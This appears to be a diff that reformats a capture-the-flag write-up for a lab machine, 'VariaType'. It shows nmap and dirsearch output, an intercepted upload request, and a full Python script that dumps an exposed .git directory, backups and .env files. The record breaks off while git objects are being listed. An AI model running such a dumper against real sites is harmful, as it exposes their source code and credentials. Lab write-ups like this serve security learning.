@@ -23,21 +23,20 @@ tags:
 
 ### 💻 Target Information
 - **Machine Name:** VariaType
-- **Operating System:** Linux (Debian)
+- **Operating System:** Linux
 - **Difficulty:** Medium
 - **Vulnerabilities:** Exposed Git Directory, CDATA XML Injection & Path Traversal in fontTools (CVE-2025-66034), Filename Command Injection in Cron Job, Sudo Privilege Escalation via setuptools PackageIndex Path Traversal (CVE-2025-47273)
 
 ---
 
-```text
-\--------------------------------------------------------------------------------------------VariaType-Notes---------------------------------------------------------------------------------
-```
 
 ## Step 1 - Reconnaissance
 
 ```bash
 nmap -A -sS -Pn -T4  --min-rate 5000 10.129.9.136
+```
 
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-17 04:31 UTC
 
 Warning: 10.129.9.136 giving up on port because retransmission cap hit (6).
@@ -162,10 +161,12 @@ Finished
 
 ```bash
 python3 dirsearch.py -u "http://variatype.htb/" -x 404
+```
 
-&#x20; _|. _ _  _  _  _ _|_    v0.4.3
+```text
+_|. _ _  _  _  _ _|_    v0.4.3
 
-&#x20;(_||| _) (/_(_|| (_| )
+ (_||| _) (/_(_|| (_| )
 
 Extensions: php, asp, aspx, jsp, html, htm
 
@@ -192,7 +193,7 @@ Task Completed
 
 - 🔍 *Intercepted POST request*
 
-```text
+```http
 POST /tools/variable-font-generator/process HTTP/1.1
 
 Host: variatype.htb
@@ -229,39 +230,39 @@ Content-Type: application/octet-stream
 
 <designspace format="4.0">
 
-&#x20;   <axes>
+    <axes>
 
-&#x20;       <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
+        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
 
-&#x20;   </axes>
+    </axes>
 
-&#x20;   <sources>
+    <sources>
 
-&#x20;       <source filename="test.ttf" name="Regular" familyname="TestFont">
+        <source filename="test.ttf" name="Regular" familyname="TestFont">
 
-&#x20;           <location>
+            <location>
 
-&#x20;               <dimension name="Weight" xvalue="400"/>
+                <dimension name="Weight" xvalue="400"/>
 
-&#x20;           </location>
+            </location>
 
-&#x20;       </source>
+        </source>
 
-&#x20;   </sources>
+    </sources>
 
-&#x20;   <instances>
+    <instances>
 
-&#x20;       <instance filename="TestFont-Regular.ttf" familyname="TestFont" stylename="Regular">
+        <instance filename="TestFont-Regular.ttf" familyname="TestFont" stylename="Regular">
 
-&#x20;           <location>
+            <location>
 
-&#x20;               <dimension name="Weight" xvalue="400"/>
+                <dimension name="Weight" xvalue="400"/>
 
-&#x20;           </location>
+            </location>
 
-&#x20;       </instance>
+        </instance>
 
-&#x20;   </instances>
+    </instances>
 
 </designspace>
 
@@ -278,7 +279,7 @@ dummy font data
 
 - 🔍 *Intercepted Response*
 
-```text
+```http
 HTTP/1.1 302 FOUND
 
 Server: nginx/1.22.1
@@ -312,12 +313,12 @@ Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJGb250IGdlbmVyYXRpb24g
 
 ```bash
 python3 dirsearch.py -u "http://portal.variatype.htb/" -x 404
+```
 
-&#x20; _|. _ _  _  _  _ _|_    v0.4.3
+```text
+_|. _ _  _  _  _ _|_    v0.4.3
 
-&#x20;(_||| _) (/_(_|| (_| )
-
-&#x20;
+ (_||| _) (/_(_|| (_| )
 
 Extensions: php, asp, aspx, jsp, html, htm
 
@@ -423,17 +424,17 @@ PROXY = None # Set to None if not using Burp
 
 logging.basicConfig(
 
-&#x20;   level=logging.INFO,
+    level=logging.INFO,
 
-&#x20;   format='%(asctime)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - %(levelname)s - %(message)s',
 
-&#x20;   handlers=[
+    handlers=[
 
-&#x20;       logging.FileHandler('download.log'),
+        logging.FileHandler('download.log'),
 
-&#x20;       logging.StreamHandler()
+        logging.StreamHandler()
 
-&#x20;   ]
+    ]
 
 )
 
@@ -441,65 +442,61 @@ logging.basicConfig(
 
 PATHS = [
 
-&#x20;   # Git repository files
+    # Git repository files
 
-&#x20;   ".git/description",
+    ".git/description",
 
-&#x20;   ".git/COMMIT_EDITMSG",
+    ".git/COMMIT_EDITMSG",
 
-&#x20;   ".git/config",
+    ".git/config",
 
-&#x20;   ".git/HEAD",
+    ".git/HEAD",
 
-&#x20;   ".git/index",
+    ".git/index",
 
-&#x20;   ".git/info/exclude",
+    ".git/info/exclude",
 
-&#x20;   ".git/logs/HEAD",
+    ".git/logs/HEAD",
 
-&#x20;   ".git/logs/refs/heads/master",
+    ".git/logs/refs/heads/master",
 
-&#x20;   ".git/refs/heads/master",
+    ".git/refs/heads/master",
 
-&#x20;
+    # Web files
 
-&#x20;   # Web files
+    "auth.php",
 
-&#x20;   "auth.php",
+    "dashboard.php",
 
-&#x20;   "dashboard.php",
+    "download.php",
 
-&#x20;   "download.php",
+    "index.php",
 
-&#x20;   "index.php",
+    # Directory paths (for structure)
 
-&#x20;
+    ".git/",
 
-&#x20;   # Directory paths (for structure)
+    ".git/hooks/",
 
-&#x20;   ".git/",
+    ".git/info/",
 
-&#x20;   ".git/hooks/",
+    ".git/branches/",
 
-&#x20;   ".git/info/",
+    ".git/logs/",
 
-&#x20;   ".git/branches/",
+    ".git/logs/refs/",
 
-&#x20;   ".git/logs/",
+    ".git/logs/refs/heads/",
 
-&#x20;   ".git/logs/refs/",
+    ".git/objects/",
 
-&#x20;   ".git/logs/refs/heads/",
+    ".git/refs/",
 
-&#x20;   ".git/objects/",
+    ".git/refs/heads/",
 
-&#x20;   ".git/refs/",
+    ".git/refs/tags/",
 
-&#x20;   ".git/refs/heads/",
-
-&#x20;   ".git/refs/tags/",
-
-&#x20;   "files/",
+    "files/",
 
 ]
 
@@ -507,53 +504,53 @@ PATHS = [
 
 GIT_FILES_EXTENDED = [
 
-&#x20;   ".git/ORIG_HEAD",
+    ".git/ORIG_HEAD",
 
-&#x20;   ".git/FETCH_HEAD",
+    ".git/FETCH_HEAD",
 
-&#x20;   ".git/MERGE_HEAD",
+    ".git/MERGE_HEAD",
 
-&#x20;   ".git/CHERRY_PICK_HEAD",
+    ".git/CHERRY_PICK_HEAD",
 
-&#x20;   ".git/REBASE_HEAD",
+    ".git/REBASE_HEAD",
 
-&#x20;   ".git/REVERT_HEAD",
+    ".git/REVERT_HEAD",
 
-&#x20;   ".git/refs/remotes/origin/master",
+    ".git/refs/remotes/origin/master",
 
-&#x20;   ".git/refs/stash",
+    ".git/refs/stash",
 
-&#x20;   ".git/refs/notes/commits",
+    ".git/refs/notes/commits",
 
-&#x20;   ".git/packed-refs",
+    ".git/packed-refs",
 
-&#x20;   ".git/objects/info/packs",
+    ".git/objects/info/packs",
 
-&#x20;   ".git/info/refs",
+    ".git/info/refs",
 
-&#x20;   ".git/logs/refs/remotes/origin/master",
+    ".git/logs/refs/remotes/origin/master",
 
-&#x20;   ".git/logs/refs/stash",
+    ".git/logs/refs/stash",
 
-&#x20;   ".git/hooks/applypatch-msg.sample",
+    ".git/hooks/applypatch-msg.sample",
 
-&#x20;   ".git/hooks/commit-msg.sample",
+    ".git/hooks/commit-msg.sample",
 
-&#x20;   ".git/hooks/post-update.sample",
+    ".git/hooks/post-update.sample",
 
-&#x20;   ".git/hooks/pre-applypatch.sample",
+    ".git/hooks/pre-applypatch.sample",
 
-&#x20;   ".git/hooks/pre-commit.sample",
+    ".git/hooks/pre-commit.sample",
 
-&#x20;   ".git/hooks/pre-push.sample",
+    ".git/hooks/pre-push.sample",
 
-&#x20;   ".git/hooks/pre-rebase.sample",
+    ".git/hooks/pre-rebase.sample",
 
-&#x20;   ".git/hooks/pre-receive.sample",
+    ".git/hooks/pre-receive.sample",
 
-&#x20;   ".git/hooks/prepare-commit-msg.sample",
+    ".git/hooks/prepare-commit-msg.sample",
 
-&#x20;   ".git/hooks/update.sample",
+    ".git/hooks/update.sample",
 
 ]
 
@@ -561,59 +558,59 @@ GIT_FILES_EXTENDED = [
 
 PHP_FILES_EXTENDED = [
 
-&#x20;   "config.php",
+    "config.php",
 
-&#x20;   "database.php",
+    "database.php",
 
-&#x20;   "db.php",
+    "db.php",
 
-&#x20;   "functions.php",
+    "functions.php",
 
-&#x20;   "login.php",
+    "login.php",
 
-&#x20;   "logout.php",
+    "logout.php",
 
-&#x20;   "register.php",
+    "register.php",
 
-&#x20;   "profile.php",
+    "profile.php",
 
-&#x20;   "admin.php",
+    "admin.php",
 
-&#x20;   "upload.php",
+    "upload.php",
 
-&#x20;   "view.php",
+    "view.php",
 
-&#x20;   "edit.php",
+    "edit.php",
 
-&#x20;   "delete.php",
+    "delete.php",
 
-&#x20;   "api.php",
+    "api.php",
 
-&#x20;   "ajax.php",
+    "ajax.php",
 
-&#x20;   "includes/header.php",
+    "includes/header.php",
 
-&#x20;   "includes/footer.php",
+    "includes/footer.php",
 
-&#x20;   "includes/navbar.php",
+    "includes/navbar.php",
 
-&#x20;   "includes/sidebar.php",
+    "includes/sidebar.php",
 
-&#x20;   "includes/config.php",
+    "includes/config.php",
 
-&#x20;   "includes/functions.php",
+    "includes/functions.php",
 
-&#x20;   "css/style.css",
+    "css/style.css",
 
-&#x20;   "js/main.js",
+    "js/main.js",
 
-&#x20;   "images/",
+    "images/",
 
-&#x20;   "assets/",
+    "assets/",
 
-&#x20;   "vendor/",
+    "vendor/",
 
-&#x20;   "node_modules/",
+    "node_modules/",
 
 ]
 
@@ -621,539 +618,463 @@ PHP_FILES_EXTENDED = [
 
 BACKUP_FILES = [
 
-&#x20;   "auth.php.bak",
+    "auth.php.bak",
 
-&#x20;   "auth.php~",
+    "auth.php~",
 
-&#x20;   "auth.php.swp",
+    "auth.php.swp",
 
-&#x20;   "auth.php.old",
+    "auth.php.old",
 
-&#x20;   "auth.php.backup",
+    "auth.php.backup",
 
-&#x20;   "dashboard.php.bak",
+    "dashboard.php.bak",
 
-&#x20;   "dashboard.php~",
+    "dashboard.php~",
 
-&#x20;   "download.php.bak",
+    "download.php.bak",
 
-&#x20;   "download.php~",
+    "download.php~",
 
-&#x20;   "index.php.bak",
+    "index.php.bak",
 
-&#x20;   "index.php~",
+    "index.php~",
 
-&#x20;   "config.php.bak",
+    "config.php.bak",
 
-&#x20;   "config.php~",
+    "config.php~",
 
-&#x20;   ".env",
+    ".env",
 
-&#x20;   ".env.local",
+    ".env.local",
 
-&#x20;   ".env.production",
+    ".env.production",
 
-&#x20;   ".env.development",
+    ".env.development",
 
-&#x20;   "composer.json",
+    "composer.json",
 
-&#x20;   "composer.lock",
+    "composer.lock",
 
-&#x20;   "package.json",
+    "package.json",
 
-&#x20;   "package-lock.json",
+    "package-lock.json",
 
 ]
 
 class PortalDownloader:
 
-&#x20;   def __init__(self, base_url, output_dir, proxy=None):
+    def __init__(self, base_url, output_dir, proxy=None):
 
-&#x20;       self.base_url = base_url
+        self.base_url = base_url
 
-&#x20;       self.output_dir = output_dir
+        self.output_dir = output_dir
 
-&#x20;       self.session = requests.Session()
+        self.session = requests.Session()
 
-&#x20;
+        # Setup proxy if provided
 
-&#x20;       # Setup proxy if provided
+        if proxy:
 
-&#x20;       if proxy:
+            self.session.proxies = {
 
-&#x20;           self.session.proxies = {
+                'http': proxy,
 
-&#x20;               'http': proxy,
+                'https': proxy
 
-&#x20;               'https': proxy
+            }
 
-&#x20;           }
+        # Headers to mimic browser
 
-&#x20;
+        self.session.headers.update({
 
-&#x20;       # Headers to mimic browser
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
 
-&#x20;       self.session.headers.update({
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
 
-&#x20;           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
+            'Accept-Language': 'en-US,en;q=0.5',
 
-&#x20;           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate',
 
-&#x20;           'Accept-Language': 'en-US,en;q=0.5',
+            'Connection': 'keep-alive',
 
-&#x20;           'Accept-Encoding': 'gzip, deflate',
+        })
 
-&#x20;           'Connection': 'keep-alive',
+        # Statistics
 
-&#x20;       })
+        self.stats = {
 
-&#x20;
+            'downloaded': 0,
 
-&#x20;       # Statistics
+            'failed': 0,
 
-&#x20;       self.stats = {
+            'skipped': 0,
 
-&#x20;           'downloaded': 0,
+            'forbidden': 0,
 
-&#x20;           'failed': 0,
+            'not_found': 0
 
-&#x20;           'skipped': 0,
+        }
 
-&#x20;           'forbidden': 0,
+    def ensure_dir(self, filepath):
 
-&#x20;           'not_found': 0
+        """Create directory structure if it doesn't exist"""
 
-&#x20;       }
+        directory = os.path.dirname(filepath)
 
-&#x20;
+        if directory and not os.path.exists(directory):
 
-&#x20;   def ensure_dir(self, filepath):
+            os.makedirs(directory, exist_ok=True)
 
-&#x20;       """Create directory structure if it doesn't exist"""
+    def download_file(self, path):
 
-&#x20;       directory = os.path.dirname(filepath)
+        """Download a single file"""
 
-&#x20;       if directory and not os.path.exists(directory):
+        url = urljoin(self.base_url, path)
 
-&#x20;           os.makedirs(directory, exist_ok=True)
+        output_path = os.path.join(self.output_dir, path)
 
-&#x20;
+        # Skip if it's a directory path
 
-&#x20;   def download_file(self, path):
+        if path.endswith('/'):
 
-&#x20;       """Download a single file"""
+            self.ensure_dir(output_path)
 
-&#x20;       url = urljoin(self.base_url, path)
+            logging.info(f"[DIR] Created: {path}")
 
-&#x20;       output_path = os.path.join(self.output_dir, path)
+            return True
 
-&#x20;
+        self.ensure_dir(output_path)
 
-&#x20;       # Skip if it's a directory path
+        try:
 
-&#x20;       if path.endswith('/'):
+            # Check if file exists and get info
 
-&#x20;           self.ensure_dir(output_path)
+            response = self.session.get(url, timeout=10, allow_redirects=True)
 
-&#x20;           logging.info(f"[DIR] Created: {path}")
+            # Handle different status codes
 
-&#x20;           return True
+            if response.status_code == 200:
 
-&#x20;
+                with open(output_path, 'wb') as f:
 
-&#x20;       self.ensure_dir(output_path)
+                    f.write(response.content)
 
-&#x20;
+                size = len(response.content)
 
-&#x20;       try:
+                logging.info(f"[200] Downloaded: {path} ({size} bytes)")
 
-&#x20;           # Check if file exists and get info
+                self.stats['downloaded'] += 1
 
-&#x20;           response = self.session.get(url, timeout=10, allow_redirects=True)
+                return True
 
-&#x20;
+            elif response.status_code == 403:
 
-&#x20;           # Handle different status codes
+                logging.info(f"[403] Forbidden: {path}")
 
-&#x20;           if response.status_code == 200:
+                self.stats['forbidden'] += 1
 
-&#x20;               with open(output_path, 'wb') as f:
+                # Save the forbidden response for reference
 
-&#x20;                   f.write(response.content)
+                with open(output_path + '.403', 'w') as f:
 
-&#x20;               size = len(response.content)
+                    f.write(f"URL: {url}\\nStatus: 403 Forbidden\\n")
 
-&#x20;               logging.info(f"[200] Downloaded: {path} ({size} bytes)")
+                return False
 
-&#x20;               self.stats['downloaded'] += 1
+            elif response.status_code == 404:
 
-&#x20;               return True
+                logging.debug(f"[404] Not found: {path}")
 
-&#x20;
+                self.stats['not_found'] += 1
 
-&#x20;           elif response.status_code == 403:
+                return False
 
-&#x20;               logging.info(f"[403] Forbidden: {path}")
+            else:
 
-&#x20;               self.stats['forbidden'] += 1
+                logging.warning(f"[{response.status_code}] Unexpected: {path}")
 
-&#x20;               # Save the forbidden response for reference
+                self.stats['failed'] += 1
 
-&#x20;               with open(output_path + '.403', 'w') as f:
+                return False
 
-&#x20;                   f.write(f"URL: {url}\\nStatus: 403 Forbidden\\n")
+        except requests.exceptions.RequestException as e:
 
-&#x20;               return False
+            logging.error(f"[ERROR] Failed to download {path}: {str(e)}")
 
-&#x20;
+            self.stats['failed'] += 1
 
-&#x20;           elif response.status_code == 404:
+            return False
 
-&#x20;               logging.debug(f"[404] Not found: {path}")
+    def download_all(self, paths, delay=0.1):
 
-&#x20;               self.stats['not_found'] += 1
+        """Download all paths with rate limiting"""
 
-&#x20;               return False
+        logging.info(f"Starting download of {len(paths)} paths to {self.output_dir}")
 
-&#x20;
+        start_time = time.time()
 
-&#x20;           else:
+        for i, path in enumerate(paths, 1):
 
-&#x20;               logging.warning(f"[{response.status_code}] Unexpected: {path}")
+            logging.info(f"Progress: {i}/{len(paths)} - {path}")
 
-&#x20;               self.stats['failed'] += 1
+            self.download_file(path)
 
-&#x20;               return False
+            time.sleep(delay)  # Rate limiting
 
-&#x20;
+            # Print stats every 20 files
 
-&#x20;       except requests.exceptions.RequestException as e:
+            if i % 20 == 0:
 
-&#x20;           logging.error(f"[ERROR] Failed to download {path}: {str(e)}")
+                self.print_stats()
 
-&#x20;           self.stats['failed'] += 1
+        # Final stats
 
-&#x20;           return False
+        elapsed = time.time() - start_time
 
-&#x20;
+        self.print_stats()
 
-&#x20;   def download_all(self, paths, delay=0.1):
+        logging.info(f"Completed in {elapsed:.2f} seconds")
 
-&#x20;       """Download all paths with rate limiting"""
+    def print_stats(self):
 
-&#x20;       logging.info(f"Starting download of {len(paths)} paths to {self.output_dir}")
+        """Print download statistics"""
 
-&#x20;       start_time = time.time()
+        logging.info("=" * 50)
 
-&#x20;
+        logging.info("DOWNLOAD STATISTICS:")
 
-&#x20;       for i, path in enumerate(paths, 1):
+        logging.info(f"  Downloaded: {self.stats['downloaded']}")
 
-&#x20;           logging.info(f"Progress: {i}/{len(paths)} - {path}")
+        logging.info(f"  Forbidden:  {self.stats['forbidden']}")
 
-&#x20;           self.download_file(path)
+        logging.info(f"  Not Found:  {self.stats['not_found']}")
 
-&#x20;           time.sleep(delay)  # Rate limiting
+        logging.info(f"  Failed:     {self.stats['failed']}")
 
-&#x20;
+        logging.info("=" * 50)
 
-&#x20;           # Print stats every 20 files
+    def try_alternative_names(self, base_path):
 
-&#x20;           if i % 20 == 0:
+        """Try common alternative names for a file"""
 
-&#x20;               self.print_stats()
+        alternatives = []
 
-&#x20;
+        if base_path.endswith('.php'):
 
-&#x20;       # Final stats
+            # Try without .php
 
-&#x20;       elapsed = time.time() - start_time
+            alternatives.append(base_path[:-4])
 
-&#x20;       self.print_stats()
+            # Try with different extensions
 
-&#x20;       logging.info(f"Completed in {elapsed:.2f} seconds")
+            for ext in ['.bak', '~', '.swp', '.old', '.backup']:
 
-&#x20;
+                alternatives.append(base_path[:-4] + ext)
 
-&#x20;   def print_stats(self):
+        return alternatives
 
-&#x20;       """Print download statistics"""
+    def extract_git_objects(self):
 
-&#x20;       logging.info("=" * 50)
+        """Attempt to extract git objects from the repository"""
 
-&#x20;       logging.info("DOWNLOAD STATISTICS:")
+        logging.info("Attempting to extract git objects...")
 
-&#x20;       logging.info(f"  Downloaded: {self.stats['downloaded']}")
+        # First, get the HEAD commit
 
-&#x20;       logging.info(f"  Forbidden:  {self.stats['forbidden']}")
+        head_path = os.path.join(self.output_dir, ".git/HEAD")
 
-&#x20;       logging.info(f"  Not Found:  {self.stats['not_found']}")
+        if os.path.exists(head_path):
 
-&#x20;       logging.info(f"  Failed:     {self.stats['failed']}")
+            with open(head_path, 'r') as f:
 
-&#x20;       logging.info("=" * 50)
+                head_content = f.read().strip()
 
-&#x20;
+            # Parse HEAD to get current branch
 
-&#x20;   def try_alternative_names(self, base_path):
+            if head_content.startswith('ref:'):
 
-&#x20;       """Try common alternative names for a file"""
+                ref = head_content[5:].strip()
 
-&#x20;       alternatives = []
+                ref_path = os.path.join(self.output_dir, ".git", ref)
 
-&#x20;       if base_path.endswith('.php'):
+                if os.path.exists(ref_path):
 
-&#x20;           # Try without .php
+                    with open(ref_path, 'r') as f:
 
-&#x20;           alternatives.append(base_path[:-4])
+                        commit_hash = f.read().strip()
 
-&#x20;           # Try with different extensions
+                    logging.info(f"Current commit hash: {commit_hash}")
 
-&#x20;           for ext in ['.bak', '~', '.swp', '.old', '.backup']:
+                    # Try to download the commit object
 
-&#x20;               alternatives.append(base_path[:-4] + ext)
+                    obj_dir = commit_hash[:2]
 
-&#x20;       return alternatives
+                    obj_file = commit_hash[2:]
 
-&#x20;
+                    obj_path = f".git/objects/{obj_dir}/{obj_file}"
 
-&#x20;   def extract_git_objects(self):
+                    self.download_file(obj_path)
 
-&#x20;       """Attempt to extract git objects from the repository"""
+        # Parse logs to find more objects
 
-&#x20;       logging.info("Attempting to extract git objects...")
+        log_path = os.path.join(self.output_dir, ".git/logs/HEAD")
 
-&#x20;
+        if os.path.exists(log_path):
 
-&#x20;       # First, get the HEAD commit
+            with open(log_path, 'r') as f:
 
-&#x20;       head_path = os.path.join(self.output_dir, ".git/HEAD")
+                for line in f:
 
-&#x20;       if os.path.exists(head_path):
+                    parts = line.split()
 
-&#x20;           with open(head_path, 'r') as f:
+                    if len(parts) >= 2:
 
-&#x20;               head_content = f.read().strip()
+                        # Each log entry has old_hash new_hash
 
-&#x20;
+                        for hash_val in parts[:2]:
 
-&#x20;           # Parse HEAD to get current branch
+                            if len(hash_val) == 40 and all(c in '0123456789abcdef' for c in hash_val):
 
-&#x20;           if head_content.startswith('ref:'):
+                                obj_dir = hash_val[:2]
 
-&#x20;               ref = head_content[5:].strip()
+                                obj_file = hash_val[2:]
 
-&#x20;               ref_path = os.path.join(self.output_dir, ".git", ref)
+                                obj_path = f".git/objects/{obj_dir}/{obj_file}"
 
-&#x20;               if os.path.exists(ref_path):
+                                self.download_file(obj_path)
 
-&#x20;                   with open(ref_path, 'r') as f:
-
-&#x20;                       commit_hash = f.read().strip()
-
-&#x20;                   logging.info(f"Current commit hash: {commit_hash}")
-
-&#x20;
-
-&#x20;                   # Try to download the commit object
-
-&#x20;                   obj_dir = commit_hash[:2]
-
-&#x20;                   obj_file = commit_hash[2:]
-
-&#x20;                   obj_path = f".git/objects/{obj_dir}/{obj_file}"
-
-&#x20;                   self.download_file(obj_path)
-
-&#x20;
-
-&#x20;       # Parse logs to find more objects
-
-&#x20;       log_path = os.path.join(self.output_dir, ".git/logs/HEAD")
-
-&#x20;       if os.path.exists(log_path):
-
-&#x20;           with open(log_path, 'r') as f:
-
-&#x20;               for line in f:
-
-&#x20;                   parts = line.split()
-
-&#x20;                   if len(parts) >= 2:
-
-&#x20;                       # Each log entry has old_hash new_hash
-
-&#x20;                       for hash_val in parts[:2]:
-
-&#x20;                           if len(hash_val) == 40 and all(c in '0123456789abcdef' for c in hash_val):
-
-&#x20;                               obj_dir = hash_val[:2]
-
-&#x20;                               obj_file = hash_val[2:]
-
-&#x20;                               obj_path = f".git/objects/{obj_dir}/{obj_file}"
-
-&#x20;                               self.download_file(obj_path)
-
-&#x20;                               time.sleep(0.05)
+                                time.sleep(0.05)
 
 def main():
 
-&#x20;   # Create downloader instance
+    # Create downloader instance
 
-&#x20;   downloader = PortalDownloader(BASE_URL, OUTPUT_DIR, PROXY)
+    downloader = PortalDownloader(BASE_URL, OUTPUT_DIR, PROXY)
 
-&#x20;
+    # Combine all paths
 
-&#x20;   # Combine all paths
+    all_paths = []
 
-&#x20;   all_paths = []
+    # Add all discovered paths
 
-&#x20;
+    all_paths.extend(PATHS)
 
-&#x20;   # Add all discovered paths
+    # Add extended git files
 
-&#x20;   all_paths.extend(PATHS)
+    all_paths.extend(GIT_FILES_EXTENDED)
 
-&#x20;
+    # Add extended PHP files
 
-&#x20;   # Add extended git files
+    all_paths.extend(PHP_FILES_EXTENDED)
 
-&#x20;   all_paths.extend(GIT_FILES_EXTENDED)
+    # Add backup files
 
-&#x20;
+    all_paths.extend(BACKUP_FILES)
 
-&#x20;   # Add extended PHP files
+    # Add paths with different case variations (for case-sensitive systems)
 
-&#x20;   all_paths.extend(PHP_FILES_EXTENDED)
+    case_variations = []
 
-&#x20;
+    for path in all_paths:
 
-&#x20;   # Add backup files
+        if path.endswith('.php'):
 
-&#x20;   all_paths.extend(BACKUP_FILES)
+            # Add uppercase variations
 
-&#x20;
+            case_variations.append(path.upper())
 
-&#x20;   # Add paths with different case variations (for case-sensitive systems)
+            case_variations.append(path.capitalize())
 
-&#x20;   case_variations = []
+    all_paths.extend(case_variations)
 
-&#x20;   for path in all_paths:
+    # Remove duplicates while preserving order
 
-&#x20;       if path.endswith('.php'):
+    seen = set()
 
-&#x20;           # Add uppercase variations
+    unique_paths = []
 
-&#x20;           case_variations.append(path.upper())
+    for path in all_paths:
 
-&#x20;           case_variations.append(path.capitalize())
+        if path not in seen:
 
-&#x20;
+            seen.add(path)
 
-&#x20;   all_paths.extend(case_variations)
+            unique_paths.append(path)
 
-&#x20;
+    logging.info(f"Total unique paths to try: {len(unique_paths)}")
 
-&#x20;   # Remove duplicates while preserving order
+    # Download all files
 
-&#x20;   seen = set()
+    downloader.download_all(unique_paths, delay=0.1)
 
-&#x20;   unique_paths = []
+    # After downloading, try to extract git objects
 
-&#x20;   for path in all_paths:
+    downloader.extract_git_objects()
 
-&#x20;       if path not in seen:
+    # Final summary
 
-&#x20;           seen.add(path)
+    logging.info("\\n" + "=" * 60)
 
-&#x20;           unique_paths.append(path)
+    logging.info("DOWNLOAD COMPLETE")
 
-&#x20;
+    logging.info(f"Files saved to: {os.path.abspath(OUTPUT_DIR)}")
 
-&#x20;   logging.info(f"Total unique paths to try: {len(unique_paths)}")
+    logging.info("Check download.log for detailed logs")
 
-&#x20;
+    logging.info("=" * 60)
 
-&#x20;   # Download all files
+    # List important files found
 
-&#x20;   downloader.download_all(unique_paths, delay=0.1)
+    logging.info("\\nImportant files found:")
 
-&#x20;
+    for root, dirs, files in os.walk(OUTPUT_DIR):
 
-&#x20;   # After downloading, try to extract git objects
+        for file in files:
 
-&#x20;   downloader.extract_git_objects()
+            if not file.endswith('.403'):  # Skip forbidden markers
 
-&#x20;
+                filepath = os.path.join(root, file)
 
-&#x20;   # Final summary
+                size = os.path.getsize(filepath)
 
-&#x20;   logging.info("\\n" + "=" * 60)
+                if size > 0:  # Only show non-empty files
 
-&#x20;   logging.info("DOWNLOAD COMPLETE")
+                    rel_path = os.path.relpath(filepath, OUTPUT_DIR)
 
-&#x20;   logging.info(f"Files saved to: {os.path.abspath(OUTPUT_DIR)}")
-
-&#x20;   logging.info("Check download.log for detailed logs")
-
-&#x20;   logging.info("=" * 60)
-
-&#x20;
-
-&#x20;   # List important files found
-
-&#x20;   logging.info("\\nImportant files found:")
-
-&#x20;   for root, dirs, files in os.walk(OUTPUT_DIR):
-
-&#x20;       for file in files:
-
-&#x20;           if not file.endswith('.403'):  # Skip forbidden markers
-
-&#x20;               filepath = os.path.join(root, file)
-
-&#x20;               size = os.path.getsize(filepath)
-
-&#x20;               if size > 0:  # Only show non-empty files
-
-&#x20;                   rel_path = os.path.relpath(filepath, OUTPUT_DIR)
-
-&#x20;                   logging.info(f"  - {rel_path} ({size} bytes)")
+                    logging.info(f"  - {rel_path} ({size} bytes)")
 
 if __name__ == "__main__":
 
-&#x20;   try:
+    try:
 
-&#x20;       main()
+        main()
 
-&#x20;   except KeyboardInterrupt:
+    except KeyboardInterrupt:
 
-&#x20;       logging.info("\\nDownload interrupted by user")
+        logging.info("\\nDownload interrupted by user")
 
-&#x20;       sys.exit(0)
+        sys.exit(0)
 
-&#x20;   except Exception as e:
+    except Exception as e:
 
-&#x20;       logging.error(f"Unexpected error: {str(e)}")
+        logging.error(f"Unexpected error: {str(e)}")
 
-&#x20;       sys.exit(1)
+        sys.exit(1)
 ```
 
 - 🔍 *After Downloading all the files, you may be able to see the portal_dump folder and inside it go to .git folder.*
 
+```bash
+ls
+```
+
 ```text
-┌──(root㉿fsocity)-[/home/…/Season-10/VariaType/portal_dump/.git]
-
-└─# ls
-
 branches        description  index  objects
 
 COMMIT_EDITMSG  HEAD         info   ORIG_HEAD
 
 config          hooks        logs   refs
-
-&#x20;
 ```
 
 - 🔍 *you'll see something like this, now before enumerating this, lets take a look at config file*
@@ -1161,112 +1082,82 @@ config          hooks        logs   refs
 ```text
 [core]
 
-&#x20;       repositoryformatversion = 0
+        repositoryformatversion = 0
 
-&#x20;       filemode = true
+        filemode = true
 
-&#x20;       bare = false
+        bare = false
 
-&#x20;       logallrefupdates = true
+        logallrefupdates = true
 
 [user]
 
-&#x20;       name = Dev Team
+        name = Dev Team
 
-&#x20;       email = dev@variatype.htb
+        email = dev@variatype.htb
 ```
 
 - 🔍 *We got a user **Dev***
 
 - 🔍 *After enumerating all the folders, i found something interesting inside the objects folder*
 
+```bash
+cd objects
+
+ls
+```
+
 ```text
-┌──(root㉿fsocity)-[/home/…/Season-10/VariaType/portal_dump/.git]
-
-└─# cd objects
-
-&#x20;
-
-┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]
-
-└─# ls
-
 00  50  6f  75  info
+```
 
-&#x20;
+```bash
+cd 6f
 
-┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]
+ls
+```
 
-└─# cd 6f
-
-&#x20;
-
-┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/6f]
-
-└─# ls
-
+```text
 021da6be7086f2595befaa025a83d1de99478b
+```
 
-&#x20;
+```bash
+cd ..
 
-┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/6f]
+cd 75
 
-└─# cd ..
+ls
+```
 
-&#x20;
-
-┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]
-
-└─# cd 75
-
-&#x20;
-
-┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/75]
-
-└─# ls
-
+```text
 3b5f5957f2020480a19bf29a0ebc80267a4a3d
+```
 
-&#x20;
+```bash
+cd ..
 
-┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/75]
+cd 50
 
-└─# cd ..
+ls
+```
 
-&#x20;
-
-┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]
-
-└─# cd 50
-
-&#x20;
-
-┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/50]
-
-└─# ls
-
+```text
